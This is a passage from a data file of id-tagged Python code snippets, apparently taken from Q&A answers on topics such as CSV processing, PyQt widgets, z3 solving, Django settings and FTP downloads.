</snippet></ROW><ROW><id>11905530</id><snippet>\d</snippet></ROW><ROW><id>11905530</id><snippet>\w</snippet></ROW><ROW><id>11905613</id><snippet>itertools.combinations()</snippet></ROW><ROW><id>11905613</id><snippet>result_list = map(dict, itertools.combinations(
    combination_dict.iteritems(), 2))
</snippet></ROW><ROW><id>11905613</id><snippet>result_list = list(map(dict, itertools.combinations(
    combination_dict.items(), 2)))
</snippet></ROW><ROW><id>11905667</id><snippet>loopcount</snippet></ROW><ROW><id>11905667</id><snippet>loopcount = 3
i = 1
while i &lt; loopcount:
    somestring = '7'
    loopcount = int(somestring)
    i += 1
</snippet></ROW><ROW><id>11905667</id><snippet>i &lt; loopcount</snippet></ROW><ROW><id>11905819</id><snippet>one_op(unk_op, arg1, arg2)</snippet></ROW><ROW><id>11905819</id><snippet>unk_op</snippet></ROW><ROW><id>11905819</id><snippet>op==1</snippet></ROW><ROW><id>11905819</id><snippet>op==2</snippet></ROW><ROW><id>11905819</id><snippet>one_op</snippet></ROW><ROW><id>11905819</id><snippet>op==1</snippet></ROW><ROW><id>11905819</id><snippet>False</snippet></ROW><ROW><id>11905819</id><snippet>one_op</snippet></ROW><ROW><id>11905819</id><snippet>arg1*arg2</snippet></ROW><ROW><id>11905819</id><snippet>print one_op(unk_op, arg1, arg2)</snippet></ROW><ROW><id>11905819</id><snippet>if</snippet></ROW><ROW><id>11905819</id><snippet>one_op</snippet></ROW><ROW><id>11905819</id><snippet>one_op</snippet></ROW><ROW><id>11905819</id><snippet>def one_op (op, arg1, arg2):
    return  If(op==1,
               arg1*arg2,
               If(op==2,
                  arg1-arg2,
                  If(op==3,
                     arg1+arg2,
                     arg1+arg2)))
</snippet></ROW><ROW><id>11905819</id><snippet>If</snippet></ROW><ROW><id>11905819</id><snippet>from z3 import *

def one_op (op, arg1, arg2):
    return  If(op==1,
               arg1*arg2,
               If(op==2,
                  arg1-arg2,
                  If(op==3,
                     arg1+arg2,
                     arg1+arg2)))

s=Solver()

arg1, arg2, result, unk_op=Ints ('arg1 arg2 result unk_op')

s.add (unk_op&gt;=1, unk_op&lt;=3)
s.add (arg1==1)
s.add (arg2==2)
s.add (result==3)
s.add (one_op(unk_op, arg1, arg2)==result)

print s.check()
print s.model()
</snippet></ROW><ROW><id>11905819</id><snippet>sat
[unk_op = 3, result = 3, arg2 = 2, arg1 = 1]
</snippet></ROW><ROW><id>11905854</id><snippet>pip</snippet></ROW><ROW><id>11905955</id><snippet>numpy.loadtxt('dmatrix.txt')</snippet></ROW><ROW><id>11905955</id><snippet>delimiter</snippet></ROW><ROW><id>11905955</id><snippet>numpy.load</snippet></ROW><ROW><id>11905955</id><snippet>numpy.save</snippet></ROW><ROW><id>11905955</id><snippet>numpy.savez</snippet></ROW><ROW><id>11905955</id><snippet>pickle</snippet></ROW><ROW><id>11906104</id><snippet>__getitem__</snippet></ROW><ROW><id>11906104</id><snippet>__getitem__</snippet></ROW><ROW><id>11906104</id><snippet>def __getitem__(self, (x,y)):
    return self.mapdata[y][x] 
</snippet></ROW><ROW><id>11906267</id><snippet>import re
with open('source.txt') as x:
    for line in x:
        if line.startswith('&lt;chapter'):
                id = re.findall('"([^"]*)"', line) #Grabs string between matching quotations
        if line.startswith('&lt;text'):
                line = line.replace('lol',id[0])
        print line[:-1]
</snippet></ROW><ROW><id>11906267</id><snippet>&lt;chapter id="1"&gt;
&lt;text class="1"&gt;
&lt;text class="1"&gt;
&lt;chapter id="2"&gt;
&lt;text class="2"&gt;
&lt;text class="2"&gt;
&lt;chapter id="3"&gt;
&lt;text class="3"&gt;
&lt;text class="3"&gt;
&lt;chapter id="4"&gt;
&lt;text class="4"&gt;
&lt;text class="4"&gt;
</snippet></ROW><ROW><id>11906435</id><snippet>list</snippet></ROW><ROW><id>11906435</id><snippet>list_a</snippet></ROW><ROW><id>11906435</id><snippet>list_b</snippet></ROW><ROW><id>11906517</id><snippet>{{=item.owner.name}}</snippet></ROW><ROW><id>11906563</id><snippet>QTableWidget.findItems</snippet></ROW><ROW><id>11906563</id><snippet>QTableWidgetItems</snippet></ROW><ROW><id>11906563</id><snippet>from PyQt4 import QtGui, QtCore

class Window(QtGui.QWidget):
    def __init__(self, rows, columns):
        QtGui.QWidget.__init__(self)
        self.table = QtGui.QTableWidget(self)
        self.table.setRowCount(rows)
        self.table.setColumnCount(columns)
        for column in range(columns):
            for row in range(rows):
                item = QtGui.QTableWidgetItem('Text%d' % row)
                self.table.setItem(row, column, item)
        self.edit = QtGui.QLineEdit(self)
        self.button = QtGui.QPushButton('Search', self)
        self.button.clicked.connect(self.handleButton)
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(self.table)
        layout.addWidget(self.edit)
        layout.addWidget(self.button)

    def handleButton(self):
        items = self.table.findItems(
            self.edit.text(), QtCore.Qt.MatchExactly)
        if items:
            results = '\n'.join(
                'row %d column %d' % (item.row() + 1, item.column() + 1)
                for item in items)
        else:
            results = 'Found Nothing'
        QtGui.QMessageBox.information(self, 'Search Results', results)

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = Window(6, 3)
    window.resize(350, 300)
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>11906567</id><snippet>del dialog
</snippet></ROW><ROW><id>11906567</id><snippet>dialog.Destroy()
</snippet></ROW><ROW><id>11906598</id><snippet>requests</snippet></ROW><ROW><id>11907022</id><snippet>import sys
from PySide import QtCore
from PySide import QtGui
from PySide import QtWebKit

class MainWindow (QtGui.QWidget):

    def __init__(self):
        super(MainWindow, self).__init__()
        self.setGeometry(300,300,800,600)
        self.setWindowTitle('QtPlayer')
        web = QtWebKit.QWebView(self)
        web.settings().setAttribute(QtWebKit.QWebSettings.PluginsEnabled, True)       
        web.load(QtCore.QUrl("http://youtu.be/Dys1_TuUmI4"))
        web.show()
        self.show()


def main():
    app = QtGui.QApplication(sys.argv)
    win = MainWindow()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main() 
</snippet></ROW><ROW><id>11907151</id><snippet>import json</snippet></ROW><ROW><id>11907151</id><snippet>httplib</snippet></ROW><ROW><id>11907151</id><snippet>urrlib2</snippet></ROW><ROW><id>11907195</id><snippet>set-cookie</snippet></ROW><ROW><id>11907231</id><snippet>subprocess</snippet></ROW><ROW><id>11907231</id><snippet>if not authenticated:
    print('Authentication failed')
    sys.exit(1)
else:
    print('Successfully authenticated!')
    proc = subprocess.Popen([program])
</snippet></ROW><ROW><id>11907627</id><snippet>functools.partial</snippet></ROW><ROW><id>11907627</id><snippet>def compute():
    value = var.get()
    result = square(value)
    list_of_results.append(result)

button = Tk.Button(root, text='click', command = compute)
...
</snippet></ROW><ROW><id>11907627</id><snippet>class App(...):
    ...
    def compute():
        ...
        result = self.square(self.var.get())
        self.results.append(result)
</snippet></ROW><ROW><id>11907634</id><snippet>self.boundjid</snippet></ROW><ROW><id>11907634</id><snippet>self.boundjid.resource</snippet></ROW><ROW><id>11907732</id><snippet>import csv 

def first_word(value):
    return value.split(" ", 1)[0]

with open(inname, "r") as infile:
    with open(outname, "w", newline="") as outfile:
        in_csv = csv.reader(infile)
        out_csv = csv.writer(outfile)

        column_names = next(in_csv)
        out_csv.writerow(column_names)

        id_index = column_names.index("ID")
        name_index = column_names.index("NAME")

        try:
            row_1 = next(in_csv)
            written_row = False

            for row_2 in in_csv:
                if first_word(row_1[name_index]) == first_word(row_2[name_index]) and row_1[id_index] != row_2[id_index]:
                    if not written_row:
                        out_csv.writerow(row_1)

                    out_csv.writerow(row_2)
                    written_row = True
                else:
                    written_row = False

                row_1 = row_2
        except StopIteration:
            # No data rows!
            pass
</snippet></ROW><ROW><id>11907732</id><snippet>with open(outname, "w") as outfile:
    in_csv = csv.reader(infile)
    out_csv = csv.writer(outfile, lineterminator="\n")
</snippet></ROW><ROW><id>11907741</id><snippet>filtering</snippet></ROW><ROW><id>11907741</id><snippet>class UserResource(ModelResource):
    class Meta:
        queryset = User.objects.all()
        resource_name = 'players'
        filtering = {
            'username': ALL_WITH_RELATIONS,
        }
</snippet></ROW><ROW><id>11907785</id><snippet>    conn = g.engine.connect()

    query = text("""INSERT INTO HR_PunchBatch
        (StoreID, UserID, Source,Timestamp,Status)
        VALUES (:StoreID,:UserID,:Source,NOW(),:Status)""")

    conn.execute(query,
        StoreID=StoreID,
        UserID=session['UserID'],
        Source=source,
        Status='New')

    batch_id = conn.execute('SELECT LAST_INSERT_ID() AS id').fetchone()

    return batch_id['id']
</snippet></ROW><ROW><id>11907817</id><snippet>d[my_list]</snippet></ROW><ROW><id>11907817</id><snippet>set.intersection(*(set(d[k]) for k in my_list))
</snippet></ROW><ROW><id>11907855</id><snippet>$ charinfo "䤀一䤀吀"
U+4900 CJK UNIFIED IDEOGRAPH-4900
U+4E00 CJK UNIFIED IDEOGRAPH-4E00
U+4900 CJK UNIFIED IDEOGRAPH-4900
U+5400 CJK UNIFIED IDEOGRAPH-5400
$ charinfo "INIT"
U+0049 LATIN CAPITAL LETTER I
U+004E LATIN CAPITAL LETTER N
U+0049 LATIN CAPITAL LETTER I
U+0054 LATIN CAPITAL LETTER T
</snippet></ROW><ROW><id>11907855</id><snippet>codecs.open()</snippet></ROW><ROW><id>11908027</id><snippet>result=...</snippet></ROW><ROW><id>11908027</id><snippet>.replace</snippet></ROW><ROW><id>11908027</id><snippet>[:-4]</snippet></ROW><ROW><id>11908027</id><snippet>from sys import argv
script, sol, save = argv

def get_line():
    data = open(sol)
    output = open(save, 'w')
    for line in data: #for each line in the input file
        result = line.replace('msl/multimedia/raw/?rawid=', 'msl-raw-images/msss/00003/mcam/')[:-4] + '-br.jpg\n'
        output.write(result)

    output.close()
    data.close()

get_line()    
</snippet></ROW><ROW><id>11908027</id><snippet>from sys import argv
script, sol = argv

data = open(sol)
for line in data:
   print line[51:85]

data.close()
</snippet></ROW><ROW><id>11908027</id><snippet>.read()</snippet></ROW><ROW><id>11908027</id><snippet>.split</snippet></ROW><ROW><id>11908027</id><snippet>&gt;&gt;&gt; line = 'stackoverflow.com/posts/11908027/'
&gt;&gt;&gt; line.split('/')
['stackoverflow.com', 'posts', '11908027', '']
&gt;&gt;&gt; line.split('/')[2]
'11908027'
&gt;&gt;&gt; line.split('/')[1]
'posts'
</snippet></ROW><ROW><id>11908154</id><snippet>SQL_AUTO_IS_NULL</snippet></ROW><ROW><id>11908154</id><snippet>1</snippet></ROW><ROW><id>11908154</id><snippet>SELECT * FROM tbl_name WHERE auto_col IS NULL
</snippet></ROW><ROW><id>11908154</id><snippet>SQL_AUTO_IS_NULL</snippet></ROW><ROW><id>11908154</id><snippet>SET</snippet></ROW><ROW><id>11908154</id><snippet>settings.py</snippet></ROW><ROW><id>11908154</id><snippet>DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        # ... your DB options
        'OPTIONS': {
            'init_command': 'SET SQL_AUTO_IS_NULL=0;'
        },
    }
}
</snippet></ROW><ROW><id>11908161</id><snippet>- url: /.*
  script: main.app

- url: /admin/.*
  script: main.app
  secure: always
  login: required
</snippet></ROW><ROW><id>11908161</id><snippet>app.yaml</snippet></ROW><ROW><id>11908161</id><snippet>secure</snippet></ROW><ROW><id>11908161</id><snippet>login</snippet></ROW><ROW><id>11908161</id><snippet>- url: /.*</snippet></ROW><ROW><id>11908161</id><snippet>- url: /admin/.*
  script: main.app
  secure: always
  login: required

- url: /.*
  script: main.app
</snippet></ROW><ROW><id>11908195</id><snippet>fileinput.input</snippet></ROW><ROW><id>11908195</id><snippet>inplace=1</snippet></ROW><ROW><id>11908195</id><snippet>for line in fileinput.input('tweet log.txt', inplace=1):
    if tweet_id in line:
        tweet_fields = line.split(';')
        old_count  = tweet_fields[-2]
        new_count = 'retweet=%d' % (int(tweet_retweet))
        line = line.replace(old_count, new_count)
        unique = 0
    print line
</snippet></ROW><ROW><id>11908195</id><snippet>print line</snippet></ROW><ROW><id>11908195</id><snippet>if</snippet></ROW><ROW><id>11908227</id><snippet>sys.exit</snippet></ROW><ROW><id>11908227</id><snippet>os._exit</snippet></ROW><ROW><id>11908227</id><snippet>self.Destroy()
</snippet></ROW><ROW><id>11908227</id><snippet>os._exit</snippet></ROW><ROW><id>11908227</id><snippet>sys.exit</snippet></ROW><ROW><id>11908227</id><snippet>wxpython</snippet></ROW><ROW><id>11908227</id><snippet>self.Destroy()</snippet></ROW><ROW><id>11908227</id><snippet>try:
    test = urllib.urlopen("http://www.google.com")
except IOError:
    wx.MessageBox("Error communicating with the server.")
    self.Destroy()
</snippet></ROW><ROW><id>11908330</id><snippet>sys.path</snippet></ROW><ROW><id>11908330</id><snippet>sys.path.insert(0, os.path.join(os.path.dirname(sys.argv[0]), 'customjson'))
import json
</snippet></ROW><ROW><id>11908651</id><snippet>nosetests</snippet></ROW><ROW><id>11908651</id><snippet>-i</snippet></ROW><ROW><id>11908651</id><snippet>--include</snippet></ROW><ROW><id>11908651</id><snippet>-i REGEX, --include=REGEX
                      This regular expression will be applied to files,
                      directories, function names, and class names for a
                      chance to include additional tests that do not match
                      TESTMATCH.  Specify this option multiple times to add
                      more regular expressions [NOSE_INCLUDE]
</snippet></ROW><ROW><id>11908743</id><snippet>OrderedDict</snippet></ROW><ROW><id>11908743</id><snippet>def sort_dict_data(data):
    return OrderedDict((datetime.strftime(k, '%d-%m-%Y'), v)
                       for k, v in sorted(data.iteritems()))
</snippet></ROW><ROW><id>11908743</id><snippet>OrderedDict</snippet></ROW><ROW><id>11908743</id><snippet>OrderedDict</snippet></ROW><ROW><id>11908860</id><snippet>True</snippet></ROW><ROW><id>11908860</id><snippet>False</snippet></ROW><ROW><id>11908860</id><snippet>if success = 1:
</snippet></ROW><ROW><id>11908860</id><snippet>==</snippet></ROW><ROW><id>11908860</id><snippet>0</snippet></ROW><ROW><id>11908860</id><snippet>1</snippet></ROW><ROW><id>11908860</id><snippet>True</snippet></ROW><ROW><id>11908860</id><snippet>False</snippet></ROW><ROW><id>11908860</id><snippet>def update(request):
    success = False

    try:
        product = Mattress.objects.get(id=id)
        success = True
    except Mattress.DoesNotExist:
        pass

    if success:
        return render_to_response("success.html")
    else:
        return render_to_response('failure.html')
</snippet></ROW><ROW><id>11908865</id><snippet>playfield = [list(None for i in xrange(22)) for i in xrange(10)]</snippet></ROW><ROW><id>11908865</id><snippet>__init__</snippet></ROW><ROW><id>11908865</id><snippet>__init__</snippet></ROW><ROW><id>11908865</id><snippet>draw</snippet></ROW><ROW><id>11908865</id><snippet>playfield[i][j]</snippet></ROW><ROW><id>11908865</id><snippet>playfield</snippet></ROW><ROW><id>11908865</id><snippet>__init__</snippet></ROW><ROW><id>11908865</id><snippet>global playfield</snippet></ROW><ROW><id>11908894</id><snippet>name in locals()</snippet></ROW><ROW><id>11908894</id><snippet>&gt;&gt;&gt; 'r' in locals()
False
&gt;&gt;&gt; for i in range(2):
    if 'r' not in locals(): r = []
    r.append(i)


&gt;&gt;&gt; r
[0, 1]
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11909035</id><snippet>board = {}
board[ 3, 6 ] = "black queen"
board[ 0, 0 ] = "white king"
</snippet></ROW><ROW><id>11909035</id><snippet>if trickyOperationSucceeds():
    return True,"Success!"
return False,"The tricky thing failed!"
</snippet></ROW><ROW><id>11909035</id><snippet>(False, "The tricky thing failed!")
{ "status": False, "message": "The tricky thing failed!" }
ResultObject( status=False, message="The tricky thing failed!" )
</snippet></ROW><ROW><id>11909118</id><snippet>cast_name = node.xpath("//package/video/cast/cast_member/display_name")
character_name = node.xpath("//package/video/cast/cast_member/character_name")
combined_cast = zip(cast_name, character_name)
cast = [(item1.text, item2.text) for item1, item2 in combined_cast]

[(Elijah Wood,#9 (voice)), (Peter Pan, #8 (voice))]
</snippet></ROW><ROW><id>11909303</id><snippet>f = open('some.log', 'r')
while True:
    line = ''
    while len(line) == 0 or line[-1] != '\n':
        tail = f.readline()
        if tail == '':
            time.sleep(0.1)          # avoid busy waiting
            # f.seek(0, io.SEEK_CUR) # appears to be unneccessary
            continue
        line += tail
    process(line)
</snippet></ROW><ROW><id>11909430</id><snippet>marshal</snippet></ROW><ROW><id>11909430</id><snippet>pickle</snippet></ROW><ROW><id>11909492</id><snippet>&lt;schedule interval="${schedule_interval.seconds}"&gt;
    &lt;ant anthome="${anthome.dir}" buildfile="${buildfiles.dir}${antbuild.file}" target="my-ant-target" uselogger="true"&gt;
        &lt;property name="build-type" value="nightly"/&gt;               
    &lt;/ant&gt;
&lt;/schedule&gt;
</snippet></ROW><ROW><id>11909717</id><snippet>ls -laR | grep "^[-l]"</snippet></ROW><ROW><id>11909717</id><snippet>l</snippet></ROW><ROW><id>11909717</id><snippet>[files for root, dirs, files in os.walk('/etc')]</snippet></ROW><ROW><id>11909717</id><snippet>import os
import subprocess
import itertools

def line_to_filename(line):
    # This assumes that filenames have no spaces, which is a false assumption
    # Ex: /etc/NetworkManager/system-connections/Wired connection 1
    idx = line.rfind('-&gt;')
    if idx &gt; -1:
        return line[:idx].split()[-1]
    else:
        return line.split()[-1]
</snippet></ROW><ROW><id>11909717</id><snippet>line_to_filename</snippet></ROW><ROW><id>11909717</id><snippet>ls -laR</snippet></ROW><ROW><id>11909717</id><snippet>expr1</snippet></ROW><ROW><id>11909717</id><snippet>expr2</snippet></ROW><ROW><id>11909717</id><snippet>proc=subprocess.Popen(
    "ls /etc -alR 2&gt;/dev/null | grep -s \"^[-l]\" ", shell = True,
    stdout = subprocess.PIPE)         #Expr1
out, err = proc.communicate()
expr1 = map(line_to_filename, out.splitlines())

expr2 = list(itertools.chain.from_iterable(
    files for root,dirs,files in os.walk('/etc') if files))  #Expr2

for expr in ('expr1', 'expr2'):
    print '{e} is of length {l}'.format(e = expr, l = len(vars()[expr]))
</snippet></ROW><ROW><id>11909717</id><snippet>expr1</snippet></ROW><ROW><id>11909717</id><snippet>expr2</snippet></ROW><ROW><id>11909717</id><snippet>for name in expr2:
    try:
        expr1.remove(name)
    except ValueError:
        print('{n} is not in expr1'.format(n = name))
</snippet></ROW><ROW><id>11909717</id><snippet>expr1</snippet></ROW><ROW><id>11909717</id><snippet>expr2</snippet></ROW><ROW><id>11909717</id><snippet>print(expr1) 
</snippet></ROW><ROW><id>11909717</id><snippet>['i386-linux-gnu_xorg_extra_modules', 'nvctrl_include', 'template-dkms-mkdsc', 'run', '1', 'conf.d', 'conf.d']
</snippet></ROW><ROW><id>11909717</id><snippet>find</snippet></ROW><ROW><id>11909717</id><snippet>/etc</snippet></ROW><ROW><id>11909822</id><snippet>suite.addTest( TestOS.TestOS() )</snippet></ROW><ROW><id>11909822</id><snippet>#main.py

import unittest
from test.Services import TestOS

if __name__ == '__main__':
    suite = unittest.TestSuite()
    tests = unittest.defaultTestLoader.loadTestsFromTestCase(TestOS)
    suite.addTests(tests)
    unittest.TextTestRunner().run(suite)
</snippet></ROW><ROW><id>11909843</id><snippet>s</snippet></ROW><ROW><id>11909843</id><snippet>s [ord(alpha) -65 ]
</snippet></ROW><ROW><id>11909843</id><snippet>alphabet.upper()</snippet></ROW><ROW><id>11909843</id><snippet>alphabet = alphabet.upper()
</snippet></ROW><ROW><id>11909843</id><snippet>dict(alphabet)</snippet></ROW><ROW><id>11909843</id><snippet>chr</snippet></ROW><ROW><id>11909843</id><snippet>s = {}
for i in range(26):  # iterate from 0 to 25
    s[alphabet[i]] = chr(65 + i)
</snippet></ROW><ROW><id>11909843</id><snippet>chr(65 + i)</snippet></ROW><ROW><id>11909843</id><snippet>alphabet[i]</snippet></ROW><ROW><id>11909911</id><snippet>import sys
[infile, outfile] = sys.argv[1:]

with open(infile) as inf:
    with open(outfile) as outf:
        for l in inf:
            outf.write(','.join(l.split('\t')).replace(',,',',n.a.,'))
</snippet></ROW><ROW><id>11909911</id><snippet>python convert_csv.py infile outfile
</snippet></ROW><ROW><id>11910026</id><snippet>Fund_Aliases.csv</snippet></ROW><ROW><id>11910026</id><snippet>with open('some.csv', newline='', encoding='utf-8') as f:
    reader = csv.reader(f)
</snippet></ROW><ROW><id>11910026</id><snippet>encoding</snippet></ROW><ROW><id>11910115</id><snippet>import re
emos = { ':)' : 'smiley.jpg',
         ':(' : 'saddy.jpg',
         ';p' : 'bllinky.jpg' }
pattern = re.compile('|'.join( re.escape(emo) for emo in emos))
def emoImg(emoMatch):
    return '&lt;img src = "/images/{0}&gt;'.format(emos[emoMatch.group(0)])
def emoSub(string):
    return pattern.sub(emoImg,string)
print(emoSub('Hi :) I miss you :('))
</snippet></ROW><ROW><id>11910230</id><snippet>Columns</snippet></ROW><ROW><id>11910230</id><snippet>Columns</snippet></ROW><ROW><id>11910230</id><snippet>render</snippet></ROW><ROW><id>11910230</id><snippet>def __init__ (self, id, description):
    self.content = 'item %s: %s...' % (str(id), description[:25])
    self.item = urwid.AttrWrap(
        urwid.Text('item %s: %s' % (id, description)), 'body', 'focus'
        )
    super(ItemWidget, self).__init__(self.item)
</snippet></ROW><ROW><id>11910452</id><snippet>new_file</snippet></ROW><ROW><id>11910452</id><snippet>import codecs
new_file = codecs.open('out', mode='w', encoding='utf-8')
</snippet></ROW><ROW><id>11910452</id><snippet>sys.getdefaultencoding()</snippet></ROW><ROW><id>11910452</id><snippet>'ascii'</snippet></ROW><ROW><id>11910542</id><snippet>application</snippet></ROW><ROW><id>11910688</id><snippet>with open(filename,'wb') as f:</snippet></ROW><ROW><id>11910688</id><snippet>/</snippet></ROW><ROW><id>11910688</id><snippet>/</snippet></ROW><ROW><id>11910688</id><snippet>from ftplib import ftp    
ftp = FTP(r'ftp.glcf.umd.edu')
ftp.login()

directory = 'glcf/Landsat/WRS2/p012/r018/p012r018_5dx19900722.TM-GLS1990'
filename = '/p012r018_5dt19900722_z20_30.tif.gz'

ftp.cwd(directory)

with open(filename[1:],'wb') as f: # slices the string, "cutting" out the "/"
    ftp.retrbinary('RETR ' + filename,f.write)

ftp.close()
</snippet></ROW><ROW><id>11910688</id><snippet>with open(filename[1:],'wb') as f:</snippet></ROW><ROW><id>11910688</id><snippet>'RETR'</snippet></ROW><ROW><id>11910688</id><snippet>'RETR ' + filename</snippet></ROW><ROW><id>11910688</id><snippet>'RETR' + filename</snippet></ROW><ROW><id>11910688</id><snippet>RETR somefile.txt</snippet></ROW><ROW><id>11910688</id><snippet>RETRsomefile.txt</snippet></ROW><ROW><id>11910728</id><snippet>csv.DictReader()</snippet></ROW><ROW><id>11910728</id><snippet>csv.DictWriter()</snippet></ROW><ROW><id>11910728</id><snippet>csv.reader</snippet></ROW><ROW><id>11910728</id><snippet>csv.writer</snippet></ROW><ROW><id>11910728</id><snippet>{'column_name': 'value', 'column_name_2': 'value2'}</snippet></ROW><ROW><id>11910728</id><snippet>name</snippet></ROW><ROW><id>11910728</id><snippet>number</snippet></ROW><ROW><id>11910728</id><snippet>number</snippet></ROW><ROW><id>11910728</id><snippet>&gt; 2</snippet></ROW><ROW><id>11910728</id><snippet>import csv

input_csv = 'aliases.csv'
output_csv = 'output.csv'

def first_word(value):
    return value.split(' ', 1)[0]

with open(input_csv, 'r') as infile:
    # Specify the fieldnames in your aliases CSV
    input_fields = ('name', 'number')

    # Set up the DictReader, which will read the file into an iterable
    # where each row is a {column_name: value} dictionary
    reader = csv.DictReader(infile, fieldnames=input_fields)

    # Now open the output file
    with open(output_csv, 'w') as outfile:
        # Define the new 'flag' field
        output_fields = ('name', 'number', 'flag')
        writer = csv.DictWriter(outfile, fieldnames=output_fields)

        # Write the column names (this is a handy convention seen elsewhere on SO)
        writer.writerow(dict((h, h) for h in output_fields))

        # Skip the first row (which is the column headers) and then store the
        # first row dictionary
        next(reader)
        first_row = next(reader)

        # Now begin your iteration through the input, writing all fields as they
        # appear, but using some logic to write the 'flag' field
        # This is where the dictionary comes into play - 'row' is actually a
        # dictionary, so you can use dictionary syntax to assign to it
        for next_row in reader:
            # Set up the variables for your comparison
            first_name = first_word(first_row['name'])
            next_name = first_word(next_row['name'])
            first_id = first_row['number']
            next_id = next_row['number']

            # Compare the current row to the previous row
            if first_name == next_name and first_id != next_id:
                # Here we are adding an element to our row dictionary - 'flag'
                first_row['flag'] = 'Y'
            # Now we write the entire first_row dictionary to the row
            writer.writerow(first_row)

            # Change the reference, just like you did
            first_row = next_row
</snippet></ROW><ROW><id>11911052</id><snippet>re.findall</snippet></ROW><ROW><id>11911052</id><snippet>re.finditer</snippet></ROW><ROW><id>11911052</id><snippet>&gt;&gt;&gt; [m.group(0) for m, _ in zip(re.finditer(r"\w", "abcdef"), range(3))]
['a', 'b', 'c']
</snippet></ROW><ROW><id>11911098</id><snippet>def print_multiplication_table(n):
    a = 1
    b = 1 # won't do harm, but doesn't really need now
    while a &lt;= n:
        b = 1 # &lt;-- note
        while b &lt;= n:
            print str(a) + " * " + str(b)
            b = b + 1
        a = a + 1
</snippet></ROW><ROW><id>11911276</id><snippet>word_set = set(your_string.split())
</snippet></ROW><ROW><id>11911276</id><snippet>&gt;&gt;&gt; word_set = set("NEW Fujifilm 16MP 5x".split())
&gt;&gt;&gt; character_set = set("NEW Fujifilm 16MP 5x")
&gt;&gt;&gt; word_set
set(['NEW', '16MP', '5x', 'Fujifilm'])
&gt;&gt;&gt; character_set
set([' ', 'f', 'E', 'F', 'i', 'M', 'j', 'm', 'l', 'N', '1', 'P', 'u', 'x', 'W', '6', '5'])
</snippet></ROW><ROW><id>11911418</id><snippet>&gt;&gt;&gt; for t in (np.int8, np.int16, np.int32, np.int64,
...           np.uint8, np.uint16, np.uint32, np.uint64):
...     sqlite3.register_adapter(t, long)
... 
&gt;&gt;&gt; cur.execute("insert into foo(bar) values(?)", np.array([1]))
&lt;sqlite3.Cursor object at 0x027A7620&gt;
</snippet></ROW><ROW><id>11911421</id><snippet>title</snippet></ROW><ROW><id>11911421</id><snippet>def document_create(request):
    user = request.user
    title = request.GET['title']
    if (title != ''):
        Draft.objects.create(content='Your content goes here', user=user, title=title)
</snippet></ROW><ROW><id>11911421</id><snippet>request.method</snippet></ROW><ROW><id>11911536</id><snippet>__init__.py</snippet></ROW><ROW><id>11911536</id><snippet>from PIL import Image</snippet></ROW><ROW><id>11911536</id><snippet>PIL.Image</snippet></ROW><ROW><id>11911536</id><snippet>os.path</snippet></ROW><ROW><id>11911717</id><snippet>{% for t,k in draft_l.items %}
</snippet></ROW><ROW><id>11911717</id><snippet>.items</snippet></ROW><ROW><id>11911743</id><snippet># module dataparser.py

INFO01, INFO02, INFO03, INFO04 = map(slice, ((0,2),(2,10),(10,15),(15,20)))

def parse(infos, data):
    return [data[info] for info in infos]
</snippet></ROW><ROW><id>11911743</id><snippet># module dataparser_user.py

import dataparser as dp

data = """\
XX20120101NAME1CITYA
XY20120101NAME2CITYB""".splitlines()

for d in data:
    print d, dp.parse((dp.INFO01, dp.INFO03), d)

# or use partial to define a function object that takes your 
# subset number of slices
from functools import partial
specific_parse = partial(dp.parse, (dp.INFO01, dp.INFO03))

for d in data:
    print d, specific_parse(d)
</snippet></ROW><ROW><id>11911743</id><snippet>enum</snippet></ROW><ROW><id>11911743</id><snippet>namedtuple</snippet></ROW><ROW><id>11911743</id><snippet>enum</snippet></ROW><ROW><id>11911743</id><snippet>namedtuple</snippet></ROW><ROW><id>11911743</id><snippet>from collections import namedtuple
FileInformation = namedtuple("FileInformation", "start end")
INFO01, INFO02, INFO03, INFO04 = map(FileInformation, ((0,2),(2,10),(10,15),(15,20)))
</snippet></ROW><ROW><id>11911931</id><snippet>'# '.join(map(create_link, users))</snippet></ROW><ROW><id>11911931</id><snippet>create_link</snippet></ROW><ROW><id>11911931</id><snippet>create_link</snippet></ROW><ROW><id>11911931</id><snippet>{%- for user in listed_of_users -%}
   &lt;p&gt; {{ user | create_link | safe }} &lt;/p&gt;
{%- endfor -%}
</snippet></ROW><ROW><id>11911931</id><snippet>create_link</snippet></ROW><ROW><id>11911931</id><snippet>create_link</snippet></ROW><ROW><id>11911931</id><snippet>environment.filters["create_link"] = create_link
</snippet></ROW><ROW><id>11911931</id><snippet>environment</snippet></ROW><ROW><id>11911931</id><snippet>jinja2</snippet></ROW><ROW><id>11912050</id><snippet>if day != 'Saturday' and day != 'Sunday'
</snippet></ROW><ROW><id>11912050</id><snippet>return day in ['Saturday', 'Sunday']
</snippet></ROW><ROW><id>11912050</id><snippet>or</snippet></ROW><ROW><id>11912050</id><snippet>or</snippet></ROW><ROW><id>11912050</id><snippet>if True or False  # day = Sunday
if False or True  # day = Saturday
if True or True   # any other day
</snippet></ROW><ROW><id>11912230</id><snippet>variable_names</snippet></ROW><ROW><id>11912230</id><snippet>list</snippet></ROW><ROW><id>11912230</id><snippet>tuple</snippet></ROW><ROW><id>11912230</id><snippet>*</snippet></ROW><ROW><id>11912230</id><snippet>variable_names</snippet></ROW><ROW><id>11912230</id><snippet>sortbyCounty(aggregate_file, sorted_file, 'C', 'T', 'Y', 'C', 'O', 'D', 'E', '9', '0')
</snippet></ROW><ROW><id>11912230</id><snippet>sortbyCounty(aggregate_file, sorted_file, 'CTYCODE90')
</snippet></ROW><ROW><id>11912230</id><snippet>variable_names</snippet></ROW><ROW><id>11912243</id><snippet>for k, v in listDict.items():
    v.pop()
</snippet></ROW><ROW><id>11912243</id><snippet>listDict</snippet></ROW><ROW><id>11912243</id><snippet>for k, v in listDict.items(): v.pop()
</snippet></ROW><ROW><id>11912327</id><snippet>C</snippet></ROW><ROW><id>11912327</id><snippet>D</snippet></ROW><ROW><id>11912327</id><snippet>self</snippet></ROW><ROW><id>11912327</id><snippet>class E(C, D):
    def do_c_thing(self):
        # Call C's version
        C.some_method(self, ...)

    def do_d_thing(self):
        # Call D's version
        D.some_method(self, ...)
